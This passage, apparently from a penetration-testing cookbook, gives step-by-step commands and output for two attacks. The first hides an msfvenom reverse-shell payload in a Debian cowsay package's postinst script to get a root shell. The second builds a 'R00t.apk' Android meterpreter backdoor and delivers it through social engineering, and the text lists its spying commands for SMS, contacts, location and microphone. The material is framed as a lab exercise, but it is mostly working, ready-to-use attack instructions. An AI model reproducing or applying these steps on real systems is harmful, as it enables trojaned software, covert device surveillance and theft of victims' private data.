
- 3. Debian packages must adhere to a strict directory structure, so we need to create a subdirectory under the program's source directory, called DEBIAN:

```
root@kali:~/trojan# mkdir cowsay/DEBIAN
root@kali:~/trojan# cd cowsay/DEBIAN/
```

- 4. Next, we need to create the control file, which is the core of the Debian package, containing all relevant metadata such as package name, version, supported architectures, and dependencies:

```
root@kali:~/cowsay/DEBIAN# cat control
Package: cowsay
Version: 3.03+dfsg2-4
Architecture: all
Maintainer: Francois Marier <francois@debian.org>
Installed-Size: 90
Depends: perl
Suggests: filters
Section: games
Priority: optional
Homepage: http://www.nog.net/~tony/warez
Description: configurable talking cow
  Cowsay (or cowthink) will turn text into happy
  ASCII cows, with speech (or thought) balloons.
  If you don't like cows, ASCII art is available to replace
  it with some other creatures (Tux, the BSD
daemon, dragons, and a plethora of animals, from a
  turkey to an elephant in a snake).
```

- 5. Then we will create a post-installation file called postinst that will add the proper permissions to our payload, which will be called cowsay_trojan, and execute it:

```
root@kali:~/cowsay/DEBIAN# cat postinst
chmod 2755 /usr/games/cowsay_trojan && /usr/games/cowsay_trojan & /usr/games/cowsay Welcome
```

- 6. Now that we have all the required files, we will generate the payload using msfvenom:

```
root@kali:~/cowsay/DEBIAN# msfvenom -a x64
--platform linux -p linux/x64/shell/reverse_tcp
LHOST=192.168.216.5 -b "\x00" -f elf -o
/root/cowsay/usr/games/cowsay_trojan
Found 2 compatible encoders
Attempting to encode payload with 1 iterations
of generic/none
generic/none failed with Encoding failed due to
a bad character (index=56, char=0x00)
Attempting to encode payload with 1 iterations
of x64/xor
x64/xor succeeded with size 167 (iteration=0)
x64/xor chosen with final size 167
Payload size: 167 bytes
Final size of elf file: 287 bytes
Saved as: /root/cowsay/usr/games/cowsay_trojan
root@kali:~/cowsay/DEBIAN#
```

- 7. Before we can build our new package, we need to make the postinst file executable using the chmod command. To build the package, we use the dpkg-deb command with the --build option, followed by the path to the program's source directory:

```
root@kali:~/cowsay/DEBIAN# chmod 755 postinst
root@kali:~/cowsay/DEBIAN# dpkg-deb --build /root/cowsay/
dpkg-deb: building package 'cowsay' in
'/root/cowsay.deb'.
root@kali:~/cowsay/DEBIAN#
```

- 8. To test our trojan, we will start a listener in a new terminal window using msfconsole with the -x option, which allows us to specify a string as console commands:

```
root@kali:~# msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST 192.168.216.5; run'
PAYLOAD => linux/x64/shell/reverse_tcp
LHOST => 192.168.216.5
[*] Started reverse TCP handler on 192.168.216.5:4444
```

![](img/6b6e557533100c0e47951d0e5e14c4ee_642_0.png)

Using the -x option with msfconsole can save you some time and allows you to launch msfconsole from scripts.

- 9. Since Kali is itself a Linux client machine, we can test the trojan simply by changing to our home directory and using the dpkg command to install the cowsay program:

```
root@kali:~/cowsay/DEBIAN# cd
root@kali:~# dpkg -i cowsay.deb
```

```
Selecting previously unselected package cowsay.
(Reading database ... 329750 files and directories currently installed.)
Preparing to unpack cowsay.deb ...
Unpacking cowsay (3.03+dfsg2-4) ...
Setting up cowsay (3.03+dfsg2-4) ...
< Welcome >
      \ ^__^
       \ (oo)\_______
          (__)\       )\/\
              ||----w |
              ||     ||
Processing triggers for man-db (2.7.6.1-2) ...
root@kali:~#
```

- 10. Sure enough, in the terminal where we are running our listener, we should see a new session which was spawned by our Linux trojan:

```
root@kali:~# msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST 192.168.216.5; run'
PAYLOAD => linux/x64/shell/reverse_tcp
LHOST => 192.168.216.5
[*] Started reverse TCP handler on 192.168.216.5:4444
[*] Sending stage (38 bytes) to 192.168.216.5
[*] Command shell session 1 opened (192.168.216.5:4444 -> 192.168.216.5:34642) at 2017-12-26 11:58:54 -0500

id
uid=0(root) gid=0(root) groups=0(root)
```

## Creating an Android backdoor

In this recipe, we will create a persistent backdoor for Android devices. Since our objective is to create a controlled test environment, I suggest using a virtual machine running Android OS; this way we can safely test exploits without worries and, when we have finished, we can simply revert to the virtual machine and start over.

### Getting ready

I will be using Android-x86 throughout this recipe; to follow along, download the `Android-x86-5.1-rc1` ISO from the http://www.android-x86.org/ site, as shown, and create a new virtual machine:

![](img/6b6e557533100c0e47951d0e5e14c4ee_644_0.png)

### How to do it...

- 1. We will be using `msfvenom` to create the backdoor using `android/meterpreter/reverse_https` for the payload:
- 2. Then, we need to set up the listener using `msfconsole` with the `-x` option to save us some time:
- 3. Getting the user to install the backdoor usually starts by sending him a link to a custom website serving our payload, stating that this app will allow him to root or unlock his phone; thus, a bit of social engineering is required. In this recipe, we can use Python to create a simple HTTP server so we can download the backdoor to our Android machine:

```
root@kali:~# msfvenom -p android/meterpreter/reverse_https LHOST=192.168.216.5 LPORT=443 R > R00t.apk
No platform was selected, choosing Msf::Module::Platform::Android from the payload
No Arch selected, selecting Arch: dalvik from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 9019 bytes

root@kali:~#
```

```
root@kali:~# msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_https; set LHOST 192.168.216.5; set LPORT 443; run'
```

```
root@kali:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80
(http://0.0.0.0:80/) ...
192.168.216.155 - - [29/Dec/2017 09:30:39]
"GET /R00t.apk HTTP/1.1" 200 -
```

- 4. After downloading the APK file, the user will get the following message:

![](img/6b6e557533100c0e47951d0e5e14c4ee_646_0.png)

Again, when using this type of attack vector, spend some time creating a site describing all the steps, so that the user knows that he needs to install apps from unknown sources, which can increase the chances of compromising the target:

![](img/6b6e557533100c0e47951d0e5e14c4ee_647_0.png)

- 5. After allowing unknown sources, you can install the backdoor and get a session on the target device:

```
[*] https://192.168.216.5:443 handling request
from 192.168.216.155; (UUID: xsljq7ea)
Staging dalvik payload (69582 bytes) ...
[*] Meterpreter session 1 opened
(192.168.216.5:443 -> 192.168.216.155:33728)
at 2017-12-29 09:32:35 -0500

meterpreter > sysinfo
Computer : localhost
OS : Android 5.1.1 - Linux 4.0.9-android-x86+ (i686)
Meterpreter : dalvik/android
meterpreter >
```

- 6. Besides all the regular meterpreter commands, using the Android payload we get a couple of specific commands:

```
meterpreter > help Android
```

# Android Commands

| Command | Description |
|---|---|
| activity_start | Start an Android activity from a Uri string |
| check_root | Check if device is rooted |
| dump_calllog | Get call log |
| dump_contacts | Get contacts list |
| dump_sms | Get sms messages |
| geolocate | Get current lat-long using geolocation |
| hide_app_icon | Hide the app icon from the launcher |
| interval_collect | Manage interval collection capabilities |
| send_sms | Sends SMS from target session |
| set_audio_mode | Set Ringer Mode |
| sqlite_query | Query a SQLite database from storage |
| wakelock | Enable/Disable Wakelock |
| wlan_geolocate | Get current lat-long using WLAN information |

```
meterpreter >
```

- 7. Looking at the output of the help command, we can see that we can now get the call logs, read and send SMS messages, and get the location of the device, among other options. This, combined with the webcam commands, allows us to get access to pretty much every feature of the device:

```
meterpreter > help webcam
```

# Stdapi: Webcam Commands

| Command | Description |
|---|---|
| record_mic | Record audio from the default microphone for X seconds |
| webcam_chat | Start a video chat |
